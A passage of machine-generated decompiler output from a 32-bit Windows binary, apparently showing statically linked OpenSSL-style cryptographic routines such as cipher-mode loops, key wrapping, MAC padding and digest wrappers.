      a4 = sub_407450(C);
      v16 = sub_432B60(C);
      v14 = (unsigned __int16 *)_tolower(C);
      v12 = (_DWORD *)(sub_4073F0(C) + 256);
      v10 = (_DWORD *)(sub_4073F0(C) + 128);
      v7 = (_DWORD *)sub_4073F0(C);
      sub_4BA200(a3, a2, 0x40000000, v7, v10, v12, v14, (int *)&a4, v16);
      sub_407460(C, a4);
      v5 -= 0x40000000;
      a3 += 0x40000000;
      a2 += 0x40000000;
      --v18;
    }
    while ( v18 );
  }
  if ( v5 )
  {
    a4 = sub_407450(C);
    v17 = sub_432B60(C);
    v15 = (unsigned __int16 *)_tolower(C);
    v13 = (_DWORD *)(sub_4073F0(C) + 256);
    v11 = (_DWORD *)(sub_4073F0(C) + 128);
    v8 = (_DWORD *)sub_4073F0(C);
    sub_4BA200(a3, a2, v5, v8, v11, v13, v15, (int *)&a4, v17);
    sub_407460(C, a4);
  }
  return 1;
}

//----- (0045F420) --------------------------------------------------------
int __cdecl sub_45F420(int C, int a2, int a3, unsigned int a4)
{
  unsigned int i; // ebp
  char v5; // bl
  unsigned int v6; // esi
  _DWORD *v7; // eax
  _DWORD *v9; // [esp-18h] [ebp-24h]
  _DWORD *v10; // [esp-14h] [ebp-20h]
  unsigned __int8 *v11; // [esp-10h] [ebp-1Ch]
  int v12; // [esp-Ch] [ebp-18h]
  char v13; // [esp+Ah] [ebp-2h] BYREF
  char v14; // [esp+Bh] [ebp-1h] BYREF

  if ( !sub_4075D0(C, 0x2000) )
    a4 *= 8;
  for ( i = 0; i < a4; *(_BYTE *)(v6 + a2) = ((unsigned __int8)(v14 & 0x80) >> v5) | *(_BYTE *)(v6 + a2) & ~(128 >> v5) )
  {
    v5 = i & 7;
    v6 = i >> 3;
    v13 = (*(_BYTE *)((i >> 3) + a3) & (unsigned __int8)(1 << (7 - (i & 7)))) != 0 ? 0x80 : 0;
    v12 = sub_432B60(C);
    v11 = (unsigned __int8 *)_tolower(C);
    v10 = (_DWORD *)(sub_4073F0(C) + 256);
    v9 = (_DWORD *)(sub_4073F0(C) + 128);
    v7 = (_DWORD *)sub_4073F0(C);
    sub_4BA420((int)&v13, (int)&v14, 1, 1u, v7, v9, v10, v11, v12);
    ++i;
  }
  return 1;
}

//----- (0045F520) --------------------------------------------------------
int __cdecl sub_45F520(int C, int a2, int a3, unsigned int a4)
{
  unsigned int v5; // ebp
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  _DWORD *v10; // [esp-10h] [ebp-20h]
  _DWORD *v11; // [esp-10h] [ebp-20h]
  _DWORD *v12; // [esp-Ch] [ebp-1Ch]
  _DWORD *v13; // [esp-Ch] [ebp-1Ch]
  unsigned __int8 *v14; // [esp-8h] [ebp-18h]
  unsigned __int8 *v15; // [esp-8h] [ebp-18h]
  int v16; // [esp-4h] [ebp-14h]
  int v17; // [esp-4h] [ebp-14h]
  int v18; // [esp+20h] [ebp+10h]

  v5 = a4;
  if ( a4 >= 0x40000000 )
  {
    v18 = a4 >> 30;
    do
    {
      v16 = sub_432B60(C);
      v14 = (unsigned __int8 *)_tolower(C);
      v12 = (_DWORD *)(sub_4073F0(C) + 256);
      v10 = (_DWORD *)(sub_4073F0(C) + 128);
      v7 = (_DWORD *)sub_4073F0(C);
      sub_4BA420(a3, a2, 8, 0x40000000u, v7, v10, v12, v14, v16);
      v5 -= 0x40000000;
      a3 += 0x40000000;
      a2 += 0x40000000;
      --v18;
    }
    while ( v18 );
  }
  if ( v5 )
  {
    v17 = sub_432B60(C);
    v15 = (unsigned __int8 *)_tolower(C);
    v13 = (_DWORD *)(sub_4073F0(C) + 256);
    v11 = (_DWORD *)(sub_4073F0(C) + 128);
    v8 = (_DWORD *)sub_4073F0(C);
    sub_4BA420(a3, a2, 8, v5, v8, v11, v13, v15, v17);
  }
  return 1;
}

//----- (0045F600) --------------------------------------------------------
void *sub_45F600()
{
  return &unk_518F80;
}

//----- (0045F610) --------------------------------------------------------
void *sub_45F610()
{
  return &unk_518FB4;
}

//----- (0045F620) --------------------------------------------------------
void *sub_45F620()
{
  return &unk_518FE8;
}

//----- (0045F630) --------------------------------------------------------
void *sub_45F630()
{
  return &unk_519050;
}

//----- (0045F640) --------------------------------------------------------
void *sub_45F640()
{
  return &unk_519084;
}

//----- (0045F650) --------------------------------------------------------
void *sub_45F650()
{
  return &unk_5190B8;
}

//----- (0045F660) --------------------------------------------------------
void *sub_45F660()
{
  return &unk_519120;
}

//----- (0045F670) --------------------------------------------------------
void *sub_45F670()
{
  return &unk_519154;
}

//----- (0045F680) --------------------------------------------------------
int __cdecl sub_45F680(int a1, unsigned __int16 *a2)
{
  _DWORD *v2; // esi

  v2 = (_DWORD *)sub_4073F0(a1);
  v2[96] = 0;
  sub_4BABD0(a2, v2);
  sub_4BABD0(a2 + 4, v2 + 32);
  qmemcpy(v2 + 64, v2, 0x80u);
  return 1;
}

//----- (0045F6D0) --------------------------------------------------------
int __cdecl sub_45F6D0(int a1, unsigned __int16 *a2)
{
  _DWORD *v2; // esi

  v2 = (_DWORD *)sub_4073F0(a1);
  v2[96] = 0;
  sub_4BABD0(a2, v2);
  sub_4BABD0(a2 + 4, v2 + 32);
  sub_4BABD0(a2 + 8, v2 + 64);
  return 1;
}

//----- (0045F720) --------------------------------------------------------
int __cdecl sub_45F720(int a1, int a2, int a3, unsigned __int8 *a4)
{
  if ( a2 != 6 )
    return -1;
  sub_407470(a1);
  if ( sub_406FF0() <= 0 )
    return 0;
  sub_4BAB40(a4);
  if ( sub_407470(a1) >= 16 )
    sub_4BAB40(a4 + 8);
  if ( sub_407470(a1) >= 24 )
    sub_4BAB40(a4 + 16);
  return 1;
}

//----- (0045F790) --------------------------------------------------------
void *sub_45F790()
{
  return &unk_51901C;
}

//----- (0045F7A0) --------------------------------------------------------
void *sub_45F7A0()
{
  return &unk_5190EC;
}

//----- (0045F7B0) --------------------------------------------------------
int __usercall sub_45F7B0@<eax>(unsigned int a1@<ecx>, int a2@<edi>, __m128i *a3@<esi>, int *a4)
{
  int result; // eax
  int *v6; // ebp
  _DWORD *v7; // eax
  unsigned int v8; // ebp
  char *v9; // eax
  int v10; // ebx
  _BYTE *v11; // eax
  int v12[2]; // [esp+Ch] [ebp-28h] BYREF
  char v13[8]; // [esp+14h] [ebp-20h] BYREF
  char v14[20]; // [esp+1Ch] [ebp-18h] BYREF

  result = -1;
  v6 = a4;
  if ( a1 >= 0x18 )
  {
    if ( a3 )
    {
      v7 = (_DWORD *)_tolower(a2);
      *v7 = 748870986;
      v7[1] = 86108281;
      sub_45F1F0(a2, (int)v12, a4, 8u);
      if ( a3 == (__m128i *)a4 )
      {
        memcpy_0(a3, &a3->m128i_u64[1], a1 - 8);
        v6 = a4 - 2;
      }
      sub_45F1F0(a2, (int)a3, v6 + 2, a1 - 16);
      sub_45F1F0(a2, (int)v13, (int *)((char *)v6 + a1 - 8), 8u);
      sub_419AA0((char *)v12, 0, 8u);
      v8 = a1 - 16;
      sub_419AA0(a3->m128i_i8, 0, a1 - 16);
      v9 = (char *)_tolower(a2);
      sub_419AA0(v9, v13, 8u);
      sub_45F1F0(a2, (int)a3, a3->m128i_i32, a1 - 16);
      sub_45F1F0(a2, (int)v12, v12, 8u);
      sub_4BB1A0(a3, a1 - 16, v14);
      if ( sub_413A50(v14, v12, 8) )
        v10 = -1;
      else
        v10 = a1 - 16;
      sub_4139E0(v12, 8u);
      sub_4139E0(v14, 0x14u);
      sub_4139E0(v13, 8u);
      v11 = (_BYTE *)_tolower(a2);
      sub_4139E0(v11, 8u);
      if ( v10 == -1 )
        sub_4139E0(a3, v8);
      return v10;
    }
    else
    {
      return a1 - 16;
    }
  }
  return result;
}
// 45F7B0: using guessed type char var_20[8];
// 45F7B0: using guessed type char var_18[20];

//----- (0045F930) --------------------------------------------------------
int __usercall sub_45F930@<eax>(size_t a1@<ecx>, int a2@<edi>, int a3@<esi>, const __m128i *Src)
{
  int v6; // eax
  _DWORD *v7; // eax
  unsigned int v8; // ebx
  _DWORD *v9; // eax
  int v10[5]; // [esp+8h] [ebp-18h] BYREF

  if ( !a3 )
    return a1 + 16;
  memcpy_0((void *)(a3 + 8), Src, a1);
  sub_4BB1A0(Src, a1, v10);
  v6 = v10[1];
  *(_DWORD *)(a1 + a3 + 8) = v10[0];
  *(_DWORD *)(a1 + a3 + 12) = v6;
  sub_4139E0(v10, 0x14u);
  _tolower(a2);
  if ( sub_406FF0() <= 0 )
    return -1;
  v7 = (_DWORD *)_tolower(a2);
  *(_DWORD *)a3 = *v7;
  *(_DWORD *)(a3 + 4) = v7[1];
  sub_45F1F0(a2, a3 + 8, (int *)(a3 + 8), a1 + 8);
  v8 = a1 + 16;
  sub_419AA0((char *)a3, 0, v8);
  v9 = (_DWORD *)_tolower(a2);
  *v9 = 748870986;
  v9[1] = 86108281;
  sub_45F1F0(a2, a3, (int *)a3, v8);
  return v8;
}

//----- (0045FA30) --------------------------------------------------------
int __cdecl sub_45FA30(int a1, __m128i *a2, __m128i *a3, size_t a4)
{
  if ( a4 >= 0x40000000 || (a4 & 7) != 0 )
    return -1;
  if ( sub_432B60(a1) )
    return sub_45F930(a4, a1, (int)a2, a3);
  return sub_45F7B0(a4, a1, a2, a3->m128i_i32);
}

//----- (0045FA90) --------------------------------------------------------
void *sub_45FA90()
{
  return &unk_519190;
}

//----- (0045FAA0) --------------------------------------------------------
int __cdecl sub_45FAA0(int a1, int a2, unsigned __int16 *a3, unsigned int a4)
{
  unsigned int v4; // edi
  unsigned __int16 *v5; // esi
  unsigned int v6; // ebx
  _DWORD *v7; // eax
  int v9; // [esp-10h] [ebp-14h]
  unsigned int v10; // [esp+14h] [ebp+10h]

  v4 = *(_DWORD *)(sub_435D30(a1) + 4);
  if ( a4 >= v4 )
  {
    v10 = a4 - v4;
    v5 = a3;
    v6 = 0;
    do
    {
      v9 = sub_432B60(a1);
      v7 = (_DWORD *)sub_4073F0(a1);
      sub_4BB210(v5, (unsigned __int16 *)((char *)v5 + a2 - (_DWORD)a3), v7, v9);
      v6 += v4;
      v5 = (unsigned __int16 *)((char *)v5 + v4);
    }
    while ( v6 <= v10 );
  }
  return 1;
}

//----- (0045FB10) --------------------------------------------------------
int __cdecl sub_45FB10(int C, _BYTE *a2, _BYTE *a3, unsigned int a4)
{
  int v5; // ebp
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  unsigned __int16 *v10; // [esp-8h] [ebp-1Ch]
  unsigned __int16 *v11; // [esp-8h] [ebp-1Ch]
  unsigned int v12; // [esp+10h] [ebp-4h]

  v5 = a4;
  if ( a4 >= 0x40000000 )
  {
    v12 = a4 >> 30;
    do
    {
      a4 = sub_407450(C);
      v10 = (unsigned __int16 *)_tolower(C);
      v7 = (_DWORD *)sub_4073F0(C);
      sub_4BB2C0(a3, a2, 0x40000000, v7, v10, (int *)&a4);
      sub_407460(C, a4);
      v5 -= 0x40000000;
      a3 += 0x40000000;
      a2 += 0x40000000;
      --v12;
    }
    while ( v12 );
  }
  if ( v5 )
  {
    a4 = sub_407450(C);
    v11 = (unsigned __int16 *)_tolower(C);
    v8 = (_DWORD *)sub_4073F0(C);
    sub_4BB2C0(a3, a2, v5, v8, v11, (int *)&a4);
    sub_407460(C, a4);
  }
  return 1;
}

//----- (0045FBF0) --------------------------------------------------------
int __cdecl sub_45FBF0(int C, int a2, int *a3, unsigned int a4)
{
  int v4; // edi
  int v5; // eax
  int *v7; // edi
  int v8; // ebx
  int v9; // ebp
  _DWORD *v10; // eax
  _DWORD *v11; // eax
  int *v12; // [esp-10h] [ebp-1Ch]
  int *v13; // [esp-10h] [ebp-1Ch]
  int v14; // [esp-Ch] [ebp-18h]
  int v15; // [esp-Ch] [ebp-18h]
  unsigned int v16; // [esp+8h] [ebp-4h]

  v4 = sub_4073F0(C);
  if ( *(_DWORD *)(v4 + 128) )
  {
    v5 = _tolower(C);
    (*(void (__cdecl **)(int *, int, unsigned int, int, int))(v4 + 128))(a3, a2, a4, v4, v5);
    return 1;
  }
  else
  {
    v7 = a3;
    v8 = a2;
    v9 = a4;
    if ( a4 >= 0x40000000 )
    {
      v16 = a4 >> 30;
      do
      {
        v14 = sub_432B60(C);
        v12 = (int *)_tolower(C);
        v10 = (_DWORD *)sub_4073F0(C);
        sub_4B9600(v7, v8, 0x40000000, v10, v12, v14);
        v9 -= 0x40000000;
        v7 += 0x10000000;
        v8 += 0x40000000;
        --v16;
      }
      while ( v16 );
    }
    if ( v9 )
    {
      v15 = sub_432B60(C);
      v13 = (int *)_tolower(C);
      v11 = (_DWORD *)sub_4073F0(C);
      sub_4B9600(v7, v8, v9, v11, v13, v15);
    }
    return 1;
  }
}

//----- (0045FCE0) --------------------------------------------------------
int __cdecl sub_45FCE0(int C, _BYTE *a2, char *a3, unsigned int a4)
{
  int v5; // ebp
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  unsigned __int16 *v10; // [esp-Ch] [ebp-20h]
  unsigned __int16 *v11; // [esp-Ch] [ebp-20h]
  int v12; // [esp-4h] [ebp-18h]
  int v13; // [esp-4h] [ebp-18h]
  unsigned int v14; // [esp+10h] [ebp-4h]

  v5 = a4;
  if ( a4 >= 0x40000000 )
  {
    v14 = a4 >> 30;
    do
    {
      a4 = sub_407450(C);
      v12 = sub_432B60(C);
      v10 = (unsigned __int16 *)_tolower(C);
      v7 = (_DWORD *)sub_4073F0(C);
      sub_4BB4B0(a3, a2, 0x40000000, v7, v10, (int *)&a4, v12);
      sub_407460(C, a4);
      v5 -= 0x40000000;
      a3 += 0x40000000;
      a2 += 0x40000000;
      --v14;
    }
    while ( v14 );
  }
  if ( v5 )
  {
    a4 = sub_407450(C);
    v13 = sub_432B60(C);
    v11 = (unsigned __int16 *)_tolower(C);
    v8 = (_DWORD *)sub_4073F0(C);
    sub_4BB4B0(a3, a2, v5, v8, v11, (int *)&a4, v13);
    sub_407460(C, a4);
  }
  return 1;
}

//----- (0045FDD0) --------------------------------------------------------
int __cdecl sub_45FDD0(int C, int a2, int a3, unsigned int a4)
{
  unsigned int v4; // ecx
  unsigned int v5; // eax
  unsigned int v6; // edi
  char v7; // bl
  unsigned int v8; // esi
  _DWORD *v9; // eax
  unsigned int v10; // eax
  unsigned __int8 *v12; // [esp-18h] [ebp-20h]
  int v13; // [esp-14h] [ebp-1Ch]
  char v14; // [esp+2h] [ebp-6h] BYREF
  char v15; // [esp+3h] [ebp-5h] BYREF
  unsigned int v16; // [esp+4h] [ebp-4h]

  v4 = a4;
  v5 = 0x8000000;
  v16 = 0x8000000;
  if ( a4 < 0x8000000 )
  {
    v16 = a4;
    v5 = a4;
  }
  if ( a4 )
  {
    do
    {
      if ( v4 < v5 )
        break;
      v6 = 0;
      if ( 8 * v5 )
      {
        do
        {
          v7 = v6 & 7;
          v8 = v6 >> 3;
          v14 = (*(_BYTE *)((v6 >> 3) + a3) & (unsigned __int8)(1 << (7 - (v6 & 7)))) != 0 ? 0x80 : 0;
          v13 = sub_432B60(C);
          v12 = (unsigned __int8 *)_tolower(C);
          v9 = (_DWORD *)sub_4073F0(C);
          sub_4BB6A0((int)&v14, (int)&v15, 1, 1u, v9, v12, v13);
          ++v6;
          v10 = 8 * v16;
          *(_BYTE *)(v8 + a2) = ((unsigned __int8)(v15 & 0x80) >> v7) | *(_BYTE *)(v8 + a2) & ~(128 >> v7);
        }
        while ( v6 < v10 );
        v4 = a4;
        v5 = v16;
      }
      a3 += v5;
      a2 += v5;
      v4 -= v5;
      a4 = v4;
      if ( v4 < v5 )
      {
        v16 = v4;
        v5 = v4;
      }
    }
    while ( v4 );
  }
  return 1;
}

//----- (0045FEF0) --------------------------------------------------------
int __cdecl sub_45FEF0(int C, int a2, int a3, unsigned int a4)
{
  unsigned int v5; // ebp
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  unsigned __int8 *v10; // [esp-8h] [ebp-18h]
  unsigned __int8 *v11; // [esp-8h] [ebp-18h]
  int v12; // [esp-4h] [ebp-14h]
  int v13; // [esp-4h] [ebp-14h]
  int v14; // [esp+20h] [ebp+10h]

  v5 = a4;
  if ( a4 >= 0x40000000 )
  {
    v14 = a4 >> 30;
    do
    {
      v12 = sub_432B60(C);
      v10 = (unsigned __int8 *)_tolower(C);
      v7 = (_DWORD *)sub_4073F0(C);
      sub_4BB6A0(a3, a2, 8, 0x40000000u, v7, v10, v12);
      v5 -= 0x40000000;
      a3 += 0x40000000;
      a2 += 0x40000000;
      --v14;
    }
    while ( v14 );
  }
  if ( v5 )
  {
    v13 = sub_432B60(C);
    v11 = (unsigned __int8 *)_tolower(C);
    v8 = (_DWORD *)sub_4073F0(C);
    sub_4BB6A0(a3, a2, 8, v5, v8, v11, v13);
  }
  return 1;
}

//----- (0045FFA0) --------------------------------------------------------
void *sub_45FFA0()
{
  return &unk_5191C4;
}

//----- (0045FFB0) --------------------------------------------------------
void *sub_45FFB0()
{
  return &unk_5191F8;
}

//----- (0045FFC0) --------------------------------------------------------
void *sub_45FFC0()
{
  return &unk_51922C;
}

//----- (0045FFD0) --------------------------------------------------------
void *sub_45FFD0()
{
  return &unk_519260;
}

//----- (0045FFE0) --------------------------------------------------------
void *sub_45FFE0()
{
  return &unk_519294;
}

//----- (0045FFF0) --------------------------------------------------------
void *sub_45FFF0()
{
  return &unk_5192C8;
}

//----- (00460000) --------------------------------------------------------
int __cdecl sub_460000(int a1, unsigned __int16 *a2)
{
  _DWORD *v2; // eax

  *(_DWORD *)(sub_4073F0(a1) + 128) = 0;
  v2 = (_DWORD *)sub_4073F0(a1);
  sub_4BABD0(a2, v2);
  return 1;
}

//----- (00460030) --------------------------------------------------------
int __cdecl sub_460030(int a1, int a2, int a3, unsigned __int8 *a4)
{
  if ( a2 != 6 )
    return -1;
  if ( sub_406FF0() <= 0 )
    return 0;
  sub_4BAB40(a4);
  return 1;
}

//----- (00460070) --------------------------------------------------------
void *sub_460070()
{
  return &unk_5192FC;
}

//----- (00460080) --------------------------------------------------------
int __cdecl sub_460080(int a1, int a2)
{
  _DWORD *v2; // eax
  int v3; // eax
  int v4; // eax

  v2 = (_DWORD *)sub_4073F0(a1);
  sub_4BABD0((unsigned __int16 *)a2, v2);
  v3 = sub_4073F0(a1);
  *(_DWORD *)(v3 + 128) = *(_DWORD *)(a2 + 8);
  *(_DWORD *)(v3 + 132) = *(_DWORD *)(a2 + 12);
  v4 = sub_4073F0(a1);
  *(_DWORD *)(v4 + 136) = *(_DWORD *)(a2 + 16);
  *(_DWORD *)(v4 + 140) = *(_DWORD *)(a2 + 20);
  return 1;
}

//----- (004600E0) --------------------------------------------------------
int __cdecl sub_4600E0(int C, _BYTE *a2, unsigned __int8 *a3, unsigned int a4)
{
  unsigned int v5; // ebp
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  unsigned __int16 *v10; // [esp-10h] [ebp-20h]
  unsigned __int16 *v11; // [esp-10h] [ebp-20h]
  unsigned __int16 *v12; // [esp-Ch] [ebp-1Ch]
  unsigned __int16 *v13; // [esp-Ch] [ebp-1Ch]
  unsigned __int8 *v14; // [esp-8h] [ebp-18h]
  unsigned __int8 *v15; // [esp-8h] [ebp-18h]
  int v16; // [esp-4h] [ebp-14h]
  int v17; // [esp-4h] [ebp-14h]
  int v18; // [esp+20h] [ebp+10h]

  v5 = a4;
  if ( a4 >= 0x40000000 )
  {
    v18 = a4 >> 30;
    do
    {
      v16 = sub_432B60(C);
      v14 = (unsigned __int8 *)(sub_4073F0(C) + 136);
      v12 = (unsigned __int16 *)(sub_4073F0(C) + 128);
      v10 = (unsigned __int16 *)_tolower(C);
      v7 = (_DWORD *)sub_4073F0(C);
      sub_4BBCE0(a3, a2, 0x40000000u, v7, v10, v12, v14, v16);
      v5 -= 0x40000000;
      a3 += 0x40000000;
      a2 += 0x40000000;
      --v18;
    }
    while ( v18 );
  }
  if ( v5 )
  {
    v17 = sub_432B60(C);
    v15 = (unsigned __int8 *)(sub_4073F0(C) + 136);
    v13 = (unsigned __int16 *)(sub_4073F0(C) + 128);
    v11 = (unsigned __int16 *)_tolower(C);
    v8 = (_DWORD *)sub_4073F0(C);
    sub_4BBCE0(a3, a2, v5, v8, v11, v13, v15, v17);
  }
  return 1;
}

//----- (004601C0) --------------------------------------------------------
int __cdecl sub_4601C0(int a1)
{
  void *v1; // esp
  _DWORD v3[2]; // [esp+0h] [ebp-24h] BYREF
  char v4; // [esp+8h] [ebp-1Ch]
  char v5; // [esp+9h] [ebp-1Bh]
  char v6; // [esp+Ah] [ebp-1Ah]
  char v7; // [esp+Bh] [ebp-19h]
  char v8; // [esp+Ch] [ebp-18h]
  char v9; // [esp+Dh] [ebp-17h]
  char v10; // [esp+Eh] [ebp-16h]
  char v11; // [esp+Fh] [ebp-15h]
  int v12; // [esp+10h] [ebp-14h]
  int v13; // [esp+14h] [ebp-10h]
  int v14; // [esp+18h] [ebp-Ch]
  int v15; // [esp+1Ch] [ebp-8h]
  _DWORD *v16; // [esp+28h] [ebp+4h]

  v16 = (_DWORD *)sub_407400(a1);
  v1 = alloca(36);
  v3[0] = 16842784;
  v3[1] = 0;
  v4 = 0;
  v5 = 0;
  v6 = 0;
  v7 = 0;
  v8 = 0;
  v9 = 0;
  v10 = 0;
  v11 = 0;
  v12 = 0;
  v13 = 0;
  v14 = 0;
  v15 = 0;
  sub_4BC2A0(v3, v16);
  return 1;
}

//----- (004601E0) --------------------------------------------------------
int __cdecl sub_4601E0(int a1, char *Src, size_t Size)
{
  int *v3; // eax

  v3 = (int *)sub_407400(a1);
  return sub_4BE0B0(v3, Src, Size);
}

//----- (00460210) --------------------------------------------------------
int __cdecl sub_460210(int a1, _DWORD *a2)
{
  int *v2; // eax

  v2 = (int *)sub_407400(a1);
  return sub_4BE140(a2, v2);
}

//----- (00460230) --------------------------------------------------------
void *sub_460230()
{
  return &unk_519330;
}

//----- (00460240) --------------------------------------------------------
int __cdecl sub_460240(int a1)
{
  void *v1; // esp
  _DWORD v3[4]; // [esp+0h] [ebp-44h] BYREF
  char v4; // [esp+10h] [ebp-34h]
  char v5; // [esp+11h] [ebp-33h]
  int v6; // [esp+12h] [ebp-32h]
  int v7; // [esp+16h] [ebp-2Eh]
  int v8; // [esp+1Ah] [ebp-2Ah]
  __int16 v9; // [esp+1Eh] [ebp-26h]
  int v10; // [esp+20h] [ebp-24h]
  int v11; // [esp+24h] [ebp-20h]
  int v12; // [esp+28h] [ebp-1Ch]
  int v13; // [esp+2Ch] [ebp-18h]
  int v14; // [esp+30h] [ebp-14h]
  int v15; // [esp+34h] [ebp-10h]
  int v16; // [esp+38h] [ebp-Ch]
  int v17; // [esp+3Ch] [ebp-8h]
  _DWORD *v18; // [esp+48h] [ebp+4h]

  v18 = (_DWORD *)sub_407400(a1);
  v1 = alloca(68);
  v3[0] = 16842816;
  memset(&v3[1], 0, 12);
  v4 = 0;
  v5 = 0;
  v6 = 0;
  v7 = 0;
  v8 = 0;
  v9 = 0;
  v10 = 0;
  v11 = 0;
  v12 = 0;
  v13 = 0;
  v14 = 0;
  v15 = 0;
  v16 = 0;
  v17 = 0;
  sub_4BE230(v3, v18);
  return 1;
}

//----- (00460260) --------------------------------------------------------
int __cdecl sub_460260(int a1, char *Src, size_t Size)
{
  unsigned int *v3; // eax

  v3 = (unsigned int *)sub_407400(a1);
  return sub_4C6880(v3, Src, Size);
}

//----- (00460290) --------------------------------------------------------
int __cdecl sub_460290(int a1, _DWORD *a2)
{
  unsigned int *v2; // eax

  v2 = (unsigned int *)sub_407400(a1);
  return sub_4C6920(a2, v2);
}

//----- (004602B0) --------------------------------------------------------
void *sub_4602B0()
{
  return &unk_519360;
}

//----- (004602C0) --------------------------------------------------------
int __cdecl sub_4602C0(void *a1)
{
  void *v2; // [esp+4h] [ebp+4h]

  v2 = (void *)sub_407400((int)a1);
  memset(v2, 0, 0xA8u);
  return 1;
}

//----- (004602E0) --------------------------------------------------------
int __cdecl sub_4602E0(int a1, __m64 *Src, int a3)
{
  __m64 *v3; // eax

  v3 = (__m64 *)sub_407400(a1);
  return sub_4C6D70(v3, Src, a3);
}

//----- (00460310) --------------------------------------------------------
int __cdecl sub_460310(int a1, __m64 *a2)
{
  __m64 *v2; // eax

  v2 = (__m64 *)sub_407400(a1);
  return sub_4C6C80(a2, v2);
}

//----- (00460330) --------------------------------------------------------
void *sub_460330()
{
  return &unk_519390;
}

//----- (00460340) --------------------------------------------------------
int __cdecl sub_460340(int a1, int *Src, size_t Size)
{
  _DWORD *v3; // eax

  v3 = (_DWORD *)sub_407400(a1);
  return sub_4C6DD0(v3, Src, Size);
}

//----- (00460370) --------------------------------------------------------
int __cdecl sub_460370(int a1, int a2)
{
  int *v2; // eax

  v2 = (int *)sub_407400(a1);
  return sub_4C6EB0(a2, v2);
}

//----- (00460390) --------------------------------------------------------
void *sub_460390()
{
  return &unk_5193C0;
}

//----- (004603A0) --------------------------------------------------------
int __cdecl sub_4603A0(int a1)
{
  _DWORD *v2; // [esp+4h] [ebp+4h]

  v2 = (_DWORD *)sub_407400(a1);
  *v2 = 0;
  v2[7] = 1;
  v2[3] = 1381126738;
  v2[4] = 1381126738;
  v2[5] = 623191333;
  v2[6] = 623191333;
  return 1;
}

//----- (004603C0) --------------------------------------------------------
int __cdecl sub_4603C0(int a1, char *Src, size_t Size)
{
  size_t *v3; // eax

  v3 = (size_t *)sub_407400(a1);
  return sub_4C7290(v3, Src, Size);
}

//----- (004603F0) --------------------------------------------------------
int __cdecl sub_4603F0(int a1, _DWORD *a2)
{
  _DWORD *v2; // eax

  v2 = (_DWORD *)sub_407400(a1);
  return sub_4C7220(a2, v2);
}

//----- (00460410) --------------------------------------------------------
void *sub_460410()
{
  return &unk_5193F0;
}

//----- (00460420) --------------------------------------------------------
int __cdecl sub_460420(int a1)
{
  _DWORD *v1; // esi
  int result; // eax

  v1 = (_DWORD *)sub_407400(a1);
  result = sub_424220(v1);
  if ( result )
    return sub_4C7000(v1 + 23);
  return result;
}

//----- (00460450) --------------------------------------------------------
int __cdecl sub_460450(int a1, __m128i *Src, size_t Size)
{
  int *v3; // esi
  int result; // eax

  v3 = (int *)sub_407400(a1);
  result = sub_424010(v3, Src->m128i_i8, Size);
  if ( result )
    return sub_444070((int)(v3 + 23), Src, Size);
  return result;
}

//----- (00460490) --------------------------------------------------------
int __cdecl sub_460490(int a1, int a2)
{
  int v2; // esi
  int result; // eax

  v2 = sub_407400(a1);
  result = sub_4240F0(a2, v2);
  if ( result )
    return sub_444150((_BYTE *)(a2 + 16), (int *)(v2 + 92));
  return result;
}

//----- (004604D0) --------------------------------------------------------
int __cdecl sub_4604D0(int a1, int a2, int a3, __m128i *a4)
{
  int *v4; // edi
  char v6[16]; // [esp+Ch] [ebp-58h] BYREF
  __m128i v7; // [esp+1Ch] [ebp-48h] BYREF
  __m128i Src[3]; // [esp+30h] [ebp-34h] BYREF

  v4 = (int *)sub_407400(a1);
  if ( a2 != 29 )
    return 0;
  if ( a3 != 48 )
    return 0;
  if ( sub_460450(a1, a4, 0x30u) <= 0 )
    return 0;
  memset(Src, 54, sizeof(Src));
  if ( !sub_424010(v4, Src[0].m128i_i8, 0x30u) || !sub_4240F0((int)v6, (int)v4) )
    return 0;
  if ( !sub_444070((int)(v4 + 23), Src, 0x28u) )
    return 0;
  if ( !sub_444150(&v7, v4 + 23) )
    return 0;
  if ( !sub_460420(a1) )
    return 0;
  if ( sub_460450(a1, a4, 0x30u) <= 0 )
    return 0;
  memset(Src, 92, sizeof(Src));
  if ( !sub_424010(v4, Src[0].m128i_i8, 0x30u)
    || !sub_424010(v4, v6, 0x10u)
    || !sub_444070((int)(v4 + 23), Src, 0x28u)
    || !sub_444070((int)(v4 + 23), &v7, 0x14u) )
  {
    return 0;
  }
  sub_4139E0(v6, 0x10u);
  sub_4139E0(&v7, 0x14u);
  return 1;
}
// 4604D0: using guessed type __m128i Src[3];
// 4604D0: using guessed type __m128i var_48;

//----- (00460660) --------------------------------------------------------
void *sub_460660()
{
  return &unk_519420;
}

//----- (00460670) --------------------------------------------------------
int __cdecl sub_460670(int a1, unsigned __int8 *Src, size_t Size)
{
  int v3; // eax

  v3 = sub_407400(a1);
  return sub_4C7A00(v3, Src, Size);
}

//----- (004606A0) --------------------------------------------------------
int __cdecl sub_4606A0(int a1, int a2)
{
  int v2; // eax

  v2 = sub_407400(a1);
  return sub_4C7AE0(a2, v2);
}

//----- (004606C0) --------------------------------------------------------
void *sub_4606C0()
{
  return &unk_519450;
}

//----- (004606D0) --------------------------------------------------------
int sub_4606D0()
{
  sub_4177C0();
  return sub_424FA0(30208, 0, 0);
}
// 424FA0: using guessed type _DWORD __cdecl sub_424FA0(_DWORD, _DWORD, _DWORD);

//----- (004606F0) --------------------------------------------------------
BOOL sub_4606F0()
{
  sub_4C8870();
  sub_4C8690();
  sub_4C8290();
  return sub_441080("alg_section", sub_4C7C10, 0);
}

//----- (00460740) --------------------------------------------------------
char __cdecl sub_460740(int a1, int a2, __m64 *a3, int a4)
{
  __m64 *v5; // esi
  int v6; // eax
  int v7; // ebx
  int v8; // edi
  int v9; // ebp
  int v10; // ecx
  unsigned int v11; // edx
  int v12; // edx
  int v13; // eax
  int v14; // edx
  __m64 m64_u64; // mm0
  int v16; // ecx
  __m64 i; // mm2
  int v18; // edx
  int v19; // edx
  int v20; // edx
  int v21; // eax
  int v22; // edx
  int v23; // ecx
  __m64 v24; // mm1
  int v25; // edx
  int v26; // eax
  int v27; // edx
  __m64 v28; // mm2
  int v29; // ecx
  __m64 v30; // mm1
  int v31; // edx
  int v32; // eax
  int v33; // edx
  __m64 v34; // mm2
  int v35; // ecx
  __m64 v36; // mm1
  int v37; // edx
  int v38; // eax
  int v39; // edx
  __m64 v40; // mm2
  int v41; // ecx
